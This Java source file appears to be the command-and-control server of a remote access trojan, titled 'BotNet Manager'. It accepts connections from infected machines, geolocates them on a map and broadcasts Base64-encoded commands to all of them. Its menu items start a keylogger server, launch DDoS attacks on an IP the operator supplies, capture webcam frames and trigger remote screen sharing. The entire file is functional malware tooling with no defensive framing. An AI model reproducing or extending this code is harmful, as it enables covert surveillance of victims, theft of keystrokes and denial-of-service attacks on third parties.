package rat_server;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.record.City;
import com.maxmind.geoip2.record.Country;
import com.maxmind.geoip2.record.Location;
import com.maxmind.geoip2.record.Postal;
import com.maxmind.geoip2.record.Subdivision;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.util.ArrayList;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import org.openstreetmap.gui.jmapviewer.JMapViewer;
import org.openstreetmap.gui.jmapviewer.MapMarkerDot;

public class RAT_Server extends JFrame
{
    private ServerSocket serverSocket;
    private JList<String> jList;
    private DefaultListModel<String> dlm;
    private ArrayList<BotManager> bots;
    private BotManager botView;
    private JPanel networkPanel,botPanel;
    private JMenuBar menuBar;
    private JMenu menu;
    private JMenuItem item,_item,__item;
    private KeyLoggerServer keyLoggerServer=null;
    private Thread serverMainThread;
    private final JMapViewer mapViewer;
    private AttackerServer attackerServer;
    private WebCamMonitor webCamMonitor;
    
    public RAT_Server(final int port)
    {
        setTitle("BotNet Manager");
        mapViewer=new JMapViewer();
        setSize(1000,700);
        addWindowListener(new WindowAdapter() {

            @Override
            public void windowClosing(WindowEvent e) {
                for(int i=0;i<keyLoggerServer.getKeyLoggersBot().size();i++)
                {
                    try
                    {
                        keyLoggerServer.getKeyLoggersBot().get(i).getOutputStream().writeUTF(" ");
                        keyLoggerServer.getKeyLoggersBot().get(i).getOutputStream().flush();
                    }
                    catch(IOException exc)
                    {
                        
                    }
                }
                System.exit(0);
            }
         });
        setLayout(new GridLayout(1,2,100,40));
        menuBar=new JMenuBar();
        menu=new JMenu("File");
        menu.add((item=new JMenuItem("KeyLogger")));
        menu.add((_item=new JMenuItem("DDOS")));
        menu.add((__item=new JMenuItem("WebCam frame")));
        menuBar.add(menu);
        setJMenuBar(menuBar);
        item.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                if(e.getSource().equals(item))
                    new Thread(new Runnable() {

                        @Override
                        public void run() {
                            if(keyLoggerServer==null)
                                keyLoggerServer=new KeyLoggerServer(54322);
                            keyLoggerServer.setVisible(true);
                        }
                    }).start();
            }
        });
        _item.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                attackerServer.sendCommandToAll(JOptionPane.showInputDialog("Insert command"),
                                                JOptionPane.showInputDialog("Insert ip address to attack"),
                                                Integer.parseInt(JOptionPane.showInputDialog("Insert seconds to run")));
            }
        });
        __item.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent ae) {
                System.out.println(dlm.getElementAt(jList.getSelectedIndex()));
                webCamMonitor.getWebCamFrame(dlm.getElementAt(jList.getSelectedIndex()));                
            }
        });
        botPanel=new JPanel();
        botPanel.setLayout(new GridLayout(2,1));
        final JTextField textField=new JTextField(20);
        final JButton button=new JButton("Send");
        button.addActionListener(new ActionListener() {

                @Override
                public void actionPerformed(ActionEvent e)
                {
                     try
                     {
                        for(int i=0;i<bots.size();i++)
                        {
                            bots.get(i).getOutputStream().writeBoolean(false);  //output?
                            bots.get(i).getOutputStream().flush();
                            bots.get(i).getOutputStream().writeBoolean(false);  //isFile?
                            bots.get(i).getOutputStream().flush();
                            bots.get(i).getOutputStream().writeBoolean(false);  //isScreenSharing?
                            bots.get(i).getOutputStream().flush();
                            bots.get(i).getOutputStream().writeUTF(Base64.encode(textField.getText().getBytes()));
                            bots.get(i).getOutputStream().flush(); 
                        }
                        textField.setText("");
                     }
                     catch(IOException exc)
                     {
                          exc.printStackTrace();
                     }
                }
        });
        bots=new ArrayList();
        dlm=new DefaultListModel();
        jList=new JList(dlm);
        jList.setPreferredSize(new Dimension(400,100));
        jList.addListSelectionListener(new ListSelectionListener() {

            @Override
            public void valueChanged(ListSelectionEvent e)
            {
                if(!e.getValueIsAdjusting())
                {
                    try
                    {
                      if(botView!=null)
                          botPanel.remove(botView);
                      botView=bots.get(jList.getSelectedIndex());
                      botPanel.add(botView);
                      botView.getJTextArea().setText(botView.getOutput());
                      botPanel.revalidate();
                      revalidate();
                    }
                    catch(ArrayIndexOutOfBoundsException exc)
                    {
                        botPanel.remove(botView);
                    }
                }
            }
        });
        jList.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
                JList list=(JList)evt.getSource();
                if(evt.getClickCount()==2)
                {
                    try
                    {
                        int index=list.getSelectedIndex();
                        bots.get(index).getOutputStream().writeBoolean(false);  //output?
                        bots.get(index).getOutputStream().flush();
                        bots.get(index).getOutputStream().writeBoolean(false);  //isFile?
                        bots.get(index).getOutputStream().flush();
                        bots.get(index).getOutputStream().writeBoolean(true);  //isScreenSharing?
                        bots.get(index).getOutputStream().flush();
                        new ScreenMonitorServer(dlm.getElementAt(index));
                    }
                    catch(IOException exc)
                    {
                        exc.printStackTrace();
                    }
                }
            }
        });
        networkPanel=new JPanel();
        networkPanel.setLayout(new GridLayout(2,2,10,10));
        JLabel tempLabel=new JLabel("BotNet commands");
        tempLabel.setHorizontalAlignment(JLabel.CENTER);
        networkPanel.add(tempLabel);
        JPanel temp=new JPanel();
        temp.setLayout(new FlowLayout());
        temp.add(textField);
        temp.add(button);
        temp.setAlignmentX(JPanel.CENTER_ALIGNMENT);
        temp.setAlignmentY(JPanel.CENTER_ALIGNMENT);
        networkPanel.add(temp);
        add(mapViewer);
        botPanel.add(jList);
        //add(networkPanel);
        add(botPanel);
        new BotLifeMonitor(dlm,bots);
        serverMainThread=new Thread(new ServerMainThread(port));
        keyLoggerServer=new KeyLoggerServer(54322);
        attackerServer=new AttackerServer();
        webCamMonitor=new WebCamMonitor();
        serverMainThread.start();
        setVisible(true);
    }
   
    public static void main(String[] args)
    {
        new RAT_Server(54321);
    }
    
    private class ServerMainThread implements Runnable
    {
        private int port;

        public ServerMainThread(int port)
        {
            this.port=port;
        }
            
        @Override
        public void run() {
            try
            {
                serverSocket=new ServerSocket(port);
                while(!serverSocket.isClosed())
                {
                    BotManager temp;
                    bots.add(temp=new BotManager(serverSocket.accept(),dlm));
                    dlm.addElement(bots.get(bots.size()-1).getSocket().getInetAddress().getHostAddress());
                    new Thread(new LocateIPOnMap(temp.getSocket().getInetAddress().getHostAddress())).start();
                }
            }
            catch(IOException exc)
            {
                exc.printStackTrace();
            }
       }
    }
    
    private class LocateIPOnMap implements Runnable
    {
        private String ip_address;
        
        public LocateIPOnMap(String ip_address)
        {
            this.ip_address=ip_address;
        }

        @Override
        public void run() {
            try
            {
                File file = new File("D:\\Users\\Daniele\\Downloads\\GeoLite2-City.mmdb");
                DatabaseReader reader = new DatabaseReader.Builder(file).build();
                CityResponse response = reader.city(InetAddress.getByName(ip_address));
                Country country = response.getCountry();
                System.out.println(country.getIsoCode());           
                System.out.println(country.getName());            
                Subdivision subdivision = response.getMostSpecificSubdivision();
                System.out.println(subdivision.getName());    
                System.out.println(subdivision.getIsoCode()); 
                City city = response.getCity();
                System.out.println(city.getName()); 
                Postal postal = response.getPostal();
                System.out.println(postal.getCode()); 
                Location location = response.getLocation();
                System.out.println(location.getLatitude());  
                System.out.println(location.getLongitude()); 
                mapViewer.addMapMarker(new MapMarkerDot(location.getLatitude(),location.getLongitude()));
            }
            catch(IOException exc)
            {
                exc.printStackTrace();
            }
            catch(GeoIp2Exception exc)
            {
                exc.printStackTrace();
            }
        }
        
        
    }
}